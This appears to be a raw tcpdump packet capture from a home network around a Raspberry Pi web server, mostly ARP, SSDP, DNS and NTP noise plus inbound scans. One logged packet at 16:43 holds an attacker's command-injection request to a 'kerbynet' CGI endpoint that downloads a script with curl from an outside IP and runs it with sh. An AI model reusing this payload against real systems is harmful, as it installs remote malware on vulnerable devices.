@@ -1,0 +1,945 @@
+16:20:29.963897 IP alarmpi.ssh > pc3.50386: Flags [P.], seq 3739277547:3739277735, ack 558573569, win 501, options [nop,nop,TS val 3860101834 ecr 2217923727], length 188
+16:20:29.964417 IP pc3.50386 > alarmpi.ssh: Flags [.], ack 188, win 8021, options [nop,nop,TS val 2217924134 ecr 3860101834], length 0
+16:20:30.804516 IP alarmpi.35846 > _gateway.domain: 36953+ [1au] PTR? 133.1.168.192.in-addr.arpa. (55)
+16:20:30.805250 IP _gateway.domain > alarmpi.35846: 36953* 1/0/1 PTR pc3. (72)
+16:20:35.809446 ARP, Request who-has alarmpi tell _gateway, length 46
+16:20:35.809554 ARP, Reply alarmpi is-at b8:27:eb:51:84:93 (oui Unknown), length 28
+16:20:46.161806 IP 59-126-31-91.HINET-IP.hinet.net.46127 > alarmpi.http: Flags [S], seq 1332508915, win 44855, options [mss 536], length 0
+16:20:46.162079 IP alarmpi.http > 59-126-31-91.HINET-IP.hinet.net.46127: Flags [S.], seq 1716823600, ack 1332508916, win 64240, options [mss 1460], length 0
+16:20:46.399914 IP alarmpi.41940 > _gateway.domain: 11199+ [1au] PTR? 91.31.126.59.in-addr.arpa. (54)
+16:20:46.476189 IP 59-126-31-91.HINET-IP.hinet.net.46127 > alarmpi.http: Flags [R], seq 1332508916, win 0, length 0
+16:20:46.525859 IP alarmpi.51196 > 59-126-31-91.HINET-IP.hinet.net.llmnr: Flags [S], seq 2647363905, win 64240, options [mss 1460,sackOK,TS val 3897338534 ecr 0,nop,wscale 7,tfo  cookiereq,nop,nop], length 0
+16:20:46.526221 IP _gateway > alarmpi: ICMP time exceeded in-transit, length 72
+16:20:46.993561 IP _gateway.domain > alarmpi.41940: 11199 1/0/1 PTR 59-126-31-91.HINET-IP.hinet.net. (99)
+16:21:29.600593 IP6 alarmpi > ff02::2: ICMP6, router solicitation, length 16
+16:21:30.083020 IP alarmpi.53469 > _gateway.domain: 57014+ [1au] PTR? 2.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.2.0.f.f.ip6.arpa. (101)
+16:21:30.130020 IP _gateway.domain > alarmpi.53469: 57014 NXDomain 0/1/1 (165)
+16:21:35.109706 ARP, Request who-has _gateway tell alarmpi, length 28
+16:21:35.109906 ARP, Reply _gateway is-at c0:4a:00:ee:d3:09 (oui Unknown), length 46
+16:22:03.629351 IP pc3.33832 > 239.255.255.250.ssdp: UDP, length 166
+16:22:04.399556 IP alarmpi.51804 > _gateway.domain: 43922+ [1au] PTR? 250.255.255.239.in-addr.arpa. (57)
+16:22:04.412450 IP _gateway.domain > alarmpi.51804: 43922 NXDomain 0/1/1 (114)
+16:22:04.631060 IP pc3.33832 > 239.255.255.250.ssdp: UDP, length 166
+16:22:05.631730 IP pc3.33832 > 239.255.255.250.ssdp: UDP, length 166
+16:22:06.632642 IP pc3.33832 > 239.255.255.250.ssdp: UDP, length 166
+16:22:09.421052 ARP, Request who-has alarmpi tell _gateway, length 46
+16:22:09.421137 ARP, Reply alarmpi is-at b8:27:eb:51:84:93 (oui Unknown), length 28
+16:23:52.775853 IP alarmpi.54171 > time.cloudflare.com.ntp: NTPv4, Client, length 48
+16:23:52.785737 ARP, Request who-has alarmpi tell _gateway, length 46
+16:23:52.785813 ARP, Reply alarmpi is-at b8:27:eb:51:84:93 (oui Unknown), length 28
+16:23:52.785971 IP time.cloudflare.com.ntp > alarmpi.54171: NTPv4, Server, length 48
+16:23:53.599534 IP alarmpi.56595 > _gateway.domain: 46502+ [1au] PTR? 1.200.159.162.in-addr.arpa. (55)
+16:23:53.620976 IP _gateway.domain > alarmpi.56595: 46502 1/0/1 PTR time.cloudflare.com. (88)
+16:23:57.829732 ARP, Request who-has _gateway tell alarmpi, length 28
+16:23:57.829932 ARP, Reply _gateway is-at c0:4a:00:ee:d3:09 (oui Unknown), length 46
+16:24:03.638487 IP pc3.41665 > 239.255.255.250.ssdp: UDP, length 166
+16:24:04.055649 ARP, Request who-has mj tell _gateway, length 46
+16:24:04.640554 IP pc3.41665 > 239.255.255.250.ssdp: UDP, length 166
+16:24:05.038854 IP alarmpi.40639 > _gateway.domain: 38786+ [1au] PTR? 130.1.168.192.in-addr.arpa. (55)
+16:24:05.039579 IP _gateway.domain > alarmpi.40639: 38786* 1/0/1 PTR mj. (71)
+16:24:05.641883 IP pc3.41665 > 239.255.255.250.ssdp: UDP, length 166
+16:24:06.643087 IP pc3.41665 > 239.255.255.250.ssdp: UDP, length 166
+16:25:36.625442 ARP, Request who-has mj tell _gateway, length 46
+16:26:03.643880 IP pc3.52996 > 239.255.255.250.ssdp: UDP, length 166
+16:26:04.645456 IP pc3.52996 > 239.255.255.250.ssdp: UDP, length 166
+16:26:05.646205 IP pc3.52996 > 239.255.255.250.ssdp: UDP, length 166
+16:26:06.647310 IP pc3.52996 > 239.255.255.250.ssdp: UDP, length 166
+16:27:14.270030 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:27:14.319527 IP alarmpi.41816 > _gateway.domain: 16801+ [1au] PTR? 180.1.168.192.in-addr.arpa. (55)
+16:27:14.320306 ARP, Request who-has alarmpi tell _gateway, length 46
+16:27:14.320389 ARP, Reply alarmpi is-at b8:27:eb:51:84:93 (oui Unknown), length 28
+16:27:14.320579 IP _gateway.domain > alarmpi.41816: 16801* 1/0/1 PTR RedmiNote8T-Redmi. (86)
+16:27:17.618240 ARP, Request who-has mj tell _gateway, length 46
+16:27:19.349704 ARP, Request who-has _gateway tell alarmpi, length 28
+16:27:19.349908 ARP, Reply _gateway is-at c0:4a:00:ee:d3:09 (oui Unknown), length 46
+16:28:03.650264 IP pc3.45483 > 239.255.255.250.ssdp: UDP, length 166
+16:28:04.651678 IP pc3.45483 > 239.255.255.250.ssdp: UDP, length 166
+16:28:05.652651 IP pc3.45483 > 239.255.255.250.ssdp: UDP, length 166
+16:28:06.653639 IP pc3.45483 > 239.255.255.250.ssdp: UDP, length 166
+16:29:17.539781 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:29:18.079111 IP alarmpi.52572 > _gateway.domain: 16465+ [1au] PTR? 128.1.168.192.in-addr.arpa. (55)
+16:29:18.079890 ARP, Request who-has alarmpi tell _gateway, length 46
+16:29:18.079978 ARP, Reply alarmpi is-at b8:27:eb:51:84:93 (oui Unknown), length 28
+16:29:18.080169 IP _gateway.domain > alarmpi.52572: 16465 NXDomain* 0/0/1 (55)
+16:29:18.081746 ARP, Request who-has 192.168.1.128 tell alarmpi, length 28
+16:29:18.286095 IP alarmpi.38980 > _gateway.domain: 46806+ [1au] PTR? 191.1.168.192.in-addr.arpa. (55)
+16:29:18.286793 IP _gateway.domain > alarmpi.38980: 46806* 1/0/1 PTR amazon-116d64fa5. (85)
+16:29:18.534826 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:29:19.109705 ARP, Request who-has 192.168.1.128 tell alarmpi, length 28
+16:29:19.546210 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:29:20.149695 ARP, Request who-has 192.168.1.128 tell alarmpi, length 28
+16:29:20.534875 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:29:21.546255 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:29:22.537483 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:29:23.109697 ARP, Request who-has _gateway tell alarmpi, length 28
+16:29:23.109897 ARP, Reply _gateway is-at c0:4a:00:ee:d3:09 (oui Unknown), length 46
+16:29:30.540717 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:29:31.568820 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:29:32.560043 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:29:33.551300 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:29:34.537678 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:29:35.537666 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:29:43.547633 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:29:44.537716 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:29:45.538761 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:29:46.539106 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:29:47.567649 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:29:48.537722 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:29:56.542493 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:29:57.537705 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:29:58.541915 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:29:59.538805 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:30:00.538649 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:30:01.537638 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:30:03.656657 IP pc3.39072 > 239.255.255.250.ssdp: UDP, length 166
+16:30:04.658306 IP pc3.39072 > 239.255.255.250.ssdp: UDP, length 166
+16:30:05.659316 IP pc3.39072 > 239.255.255.250.ssdp: UDP, length 166
+16:30:06.660327 IP pc3.39072 > 239.255.255.250.ssdp: UDP, length 166
+16:30:09.541661 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:30:10.538796 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:30:11.537627 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:30:12.559102 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:30:13.538891 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:30:14.537675 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+16:30:17.623511 ARP, Request who-has mj tell _gateway, length 46
+16:32:03.662597 IP pc3.38945 > 239.255.255.250.ssdp: UDP, length 166
+16:32:04.663629 IP pc3.38945 > 239.255.255.250.ssdp: UDP, length 166
+16:32:05.664030 IP pc3.38945 > 239.255.255.250.ssdp: UDP, length 166
+16:32:06.665466 IP pc3.38945 > 239.255.255.250.ssdp: UDP, length 166
+16:32:52.105647 ARP, Request who-has alarmpi tell _gateway, length 46
+16:32:52.105751 ARP, Reply alarmpi is-at b8:27:eb:51:84:93 (oui Unknown), length 28
+16:32:52.105914 IP 68.183.112.140.48968 > alarmpi.http: Flags [S], seq 3899304184, win 1024, options [mss 536], length 0
+16:32:52.106158 IP alarmpi.http > 68.183.112.140.48968: Flags [S.], seq 2321547426, ack 3899304185, win 64240, options [mss 1460], length 0
+16:32:52.319716 IP alarmpi.58010 > _gateway.domain: 47831+ [1au] PTR? 140.112.183.68.in-addr.arpa. (56)
+16:32:52.370386 IP _gateway.domain > alarmpi.58010: 47831 NXDomain 0/1/1 (123)
+16:32:52.372067 IP alarmpi.47542 > 68.183.112.140.llmnr: Flags [S], seq 2821853476, win 64240, options [mss 1460,sackOK,TS val 140496048 ecr 0,nop,wscale 7,tfo  cookiereq,nop,nop], length 0
+16:32:52.372425 IP _gateway > alarmpi: ICMP time exceeded in-transit, length 72
+16:32:52.637568 IP 68.183.112.140.48968 > alarmpi.http: Flags [R], seq 3899304185, win 0, length 0
+16:32:57.109702 ARP, Request who-has _gateway tell alarmpi, length 28
+16:32:57.110033 ARP, Reply _gateway is-at c0:4a:00:ee:d3:09 (oui Unknown), length 46
+16:33:17.623800 ARP, Request who-has mj tell _gateway, length 46
+16:34:03.669259 IP pc3.53274 > 239.255.255.250.ssdp: UDP, length 166
+16:34:04.670759 IP pc3.53274 > 239.255.255.250.ssdp: UDP, length 166
+16:34:05.671736 IP pc3.53274 > 239.255.255.250.ssdp: UDP, length 166
+16:34:06.672461 IP pc3.53274 > 239.255.255.250.ssdp: UDP, length 166
+16:34:24.553426 ARP, Request who-has amazon-116d64fa5 tell _gateway, length 46
+16:36:03.675956 IP pc3.43142 > 239.255.255.250.ssdp: UDP, length 166
+16:36:04.023503 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:36:04.677931 IP pc3.43142 > 239.255.255.250.ssdp: UDP, length 166
+16:36:05.013962 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:36:05.679554 IP pc3.43142 > 239.255.255.250.ssdp: UDP, length 166
+16:36:06.013994 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:36:06.680583 IP pc3.43142 > 239.255.255.250.ssdp: UDP, length 166
+16:36:11.704429 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:36:12.704081 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:36:13.704102 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:36:17.929195 ARP, Request who-has amazon-116d64fa5 tell _gateway, length 46
+16:36:19.383472 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:36:20.374208 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:36:21.374283 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:36:27.063495 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:36:28.054357 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:36:29.054349 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:36:34.743508 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:36:35.734453 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:36:36.734493 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:36:42.423682 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:36:43.414581 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:36:44.414592 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:36:50.103943 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:36:51.094700 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:36:52.094719 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:36:57.783579 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:36:58.774973 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:36:59.774879 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:37:05.463752 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:37:06.454949 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:37:07.454967 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:37:13.143847 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:37:14.135085 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:37:15.135103 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:37:20.823469 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:37:21.815196 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:37:22.815223 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:37:28.504505 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:37:29.495325 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:37:30.495340 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:03.683195 IP pc3.48897 > 239.255.255.250.ssdp: UDP, length 166
+16:38:04.684964 IP pc3.48897 > 239.255.255.250.ssdp: UDP, length 166
+16:38:05.685713 IP pc3.48897 > 239.255.255.250.ssdp: UDP, length 166
+16:38:06.686876 IP pc3.48897 > 239.255.255.250.ssdp: UDP, length 166
+16:38:26.433662 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:27.426258 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:28.426275 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:29.460829 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:30.456312 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:31.456324 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:32.490536 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:33.486360 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:34.486390 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:35.520687 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:36.516469 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:37.516434 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:38.550544 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:39.546455 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:40.546485 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:41.580577 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:42.576503 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:43.576524 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:44.610662 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:45.606553 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:46.606565 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:47.640691 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:48.636604 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:49.636643 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:50.670684 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:51.666656 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:52.666661 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:53.700719 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:54.696706 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:55.696726 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:56.732615 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:57.726771 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:58.726763 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:38:59.760720 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:00.756810 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:01.756826 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:02.790624 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:03.786852 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:04.786855 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:05.820512 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:06.816897 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:07.816917 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:08.850500 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:09.846962 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:10.846969 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:11.888474 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:12.887014 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:13.887023 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:14.920546 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:15.917046 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:16.917069 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:17.950744 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:18.947095 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:19.947147 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:20.980684 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:21.977157 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:22.977169 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:24.010498 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:25.007216 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:26.007208 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:27.040503 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:28.037262 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:29.037264 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:30.070488 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:31.067301 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:32.067310 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:33.100532 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:34.097339 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:35.097382 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:36.130761 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:37.127409 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:38.127408 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:39.160419 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:40.157439 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:41.157477 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:42.190535 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:43.187514 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:44.187508 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:45.222523 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:46.217549 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:47.217571 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:48.254018 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:49.247620 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:50.247626 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:51.282675 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:52.277643 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:53.277694 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:54.312665 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:55.307685 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:56.307705 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:57.342681 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:58.337747 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:39:59.337773 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:40:00.373280 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:40:01.367815 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:40:02.367803 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:40:03.402846 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:40:03.689481 IP pc3.43966 > 239.255.255.250.ssdp: UDP, length 166
+16:40:04.397838 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:40:04.691034 IP pc3.43966 > 239.255.255.250.ssdp: UDP, length 166
+16:40:05.397858 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:40:05.691895 IP pc3.43966 > 239.255.255.250.ssdp: UDP, length 166
+16:40:06.432936 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:40:06.692834 IP pc3.43966 > 239.255.255.250.ssdp: UDP, length 166
+16:40:07.427884 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:40:08.427902 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:40:17.623540 ARP, Request who-has mj tell _gateway, length 46
+16:40:18.122468 ARP, Request who-has amazon-116d64fa5 tell _gateway, length 46
+16:40:18.618088 ARP, Request who-has mj tell _gateway, length 46
+16:40:19.618093 ARP, Request who-has mj tell _gateway, length 46
+16:40:21.790973 ARP, Request who-has mj tell _gateway, length 46
+16:40:22.788152 ARP, Request who-has mj tell _gateway, length 46
+16:40:23.788151 ARP, Request who-has mj tell _gateway, length 46
+16:40:26.139059 ARP, Request who-has mj tell _gateway, length 46
+16:40:27.138215 ARP, Request who-has mj tell _gateway, length 46
+16:40:28.138231 ARP, Request who-has mj tell _gateway, length 46
+16:40:34.587027 ARP, Request who-has mj tell _gateway, length 46
+16:40:35.578341 ARP, Request who-has mj tell _gateway, length 46
+16:40:36.578395 ARP, Request who-has mj tell _gateway, length 46
+16:40:52.254983 ARP, Request who-has mj tell _gateway, length 46
+16:40:53.248637 ARP, Request who-has mj tell _gateway, length 46
+16:40:54.248672 ARP, Request who-has mj tell _gateway, length 46
+16:42:03.695627 IP pc3.38094 > 239.255.255.250.ssdp: UDP, length 166
+16:42:04.696463 IP pc3.38094 > 239.255.255.250.ssdp: UDP, length 166
+16:42:05.696860 IP pc3.38094 > 239.255.255.250.ssdp: UDP, length 166
+16:42:06.698273 IP pc3.38094 > 239.255.255.250.ssdp: UDP, length 166
+16:42:26.211186 ARP, Request who-has amazon-116d64fa5 tell _gateway, length 46
+16:43:12.021328 ARP, Request who-has alarmpi tell _gateway, length 46
+16:43:12.021433 ARP, Reply alarmpi is-at b8:27:eb:51:84:93 (oui Unknown), length 28
+16:43:12.021612 IP nz104l173.bb60246.ctm.net.48544 > alarmpi.http: Flags [S], seq 265591884, win 65535, options [mss 1460,sackOK,TS val 44486422 ecr 0,nop,wscale 6], length 0
+16:43:12.021858 IP alarmpi.http > nz104l173.bb60246.ctm.net.48544: Flags [S.], seq 3265538063, ack 265591885, win 65160, options [mss 1460,sackOK,TS val 4042762043 ecr 44486422,nop,wscale 7], length 0
+16:43:12.159227 IP alarmpi.51361 > _gateway.domain: 18748+ [1au] PTR? 173.104.246.60.in-addr.arpa. (56)
+16:43:12.173509 IP _gateway.domain > alarmpi.51361: 18748 1/0/1 PTR nz104l173.bb60246.ctm.net. (95)
+16:43:12.270180 IP nz104l173.bb60246.ctm.net.48544 > alarmpi.http: Flags [.], ack 1, win 1369, options [nop,nop,TS val 44486447 ecr 4042762043], length 0
+16:43:12.956736 IP nz104l173.bb60246.ctm.net.48544 > alarmpi.http: Flags [P.], seq 1:151, ack 1, win 1369, options [nop,nop,TS val 44486515 ecr 4042762043], length 150: HTTP: GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0
+16:43:12.956956 IP alarmpi.http > nz104l173.bb60246.ctm.net.48544: Flags [.], ack 151, win 508, options [nop,nop,TS val 4042762978 ecr 44486515], length 0
+16:43:12.957500 IP alarmpi.http > nz104l173.bb60246.ctm.net.48544: Flags [P.], seq 1:304, ack 151, win 508, options [nop,nop,TS val 4042762979 ecr 44486515], length 303: HTTP: HTTP/1.1 404 Not Found
+16:43:12.957965 IP alarmpi.http > nz104l173.bb60246.ctm.net.48544: Flags [F.], seq 304, ack 151, win 508, options [nop,nop,TS val 4042762979 ecr 44486515], length 0
+16:43:13.208419 IP nz104l173.bb60246.ctm.net.48544 > alarmpi.http: Flags [.], ack 304, win 1369, options [nop,nop,TS val 44486541 ecr 4042762979], length 0
+16:43:13.247103 IP nz104l173.bb60246.ctm.net.48544 > alarmpi.http: Flags [.], ack 305, win 1369, options [nop,nop,TS val 44486545 ecr 4042762979], length 0
+16:43:38.195906 IP nz104l173.bb60246.ctm.net.48544 > alarmpi.http: Flags [R.], seq 151, ack 305, win 1369, options [nop,nop,TS val 44489039 ecr 4042762979], length 0
+16:44:00.916639 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:44:01.911742 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:44:02.911747 ARP, Request who-has RedmiNote8T-Redmi tell _gateway, length 46
+16:44:03.702327 IP pc3.53139 > 239.255.255.250.ssdp: UDP, length 166
+16:44:04.703637 IP pc3.53139 > 239.255.255.250.ssdp: UDP, length 166
+16:44:05.704752 IP pc3.53139 > 239.255.255.250.ssdp: UDP, length 166
+16:44:05.953820 IP nz104l173.bb60246.ctm.net.51444 > alarmpi.http: Flags [S], seq 2020103609, win 65535, options [mss 1460,sackOK,TS val 44491820 ecr 0,nop,wscale 6], length 0
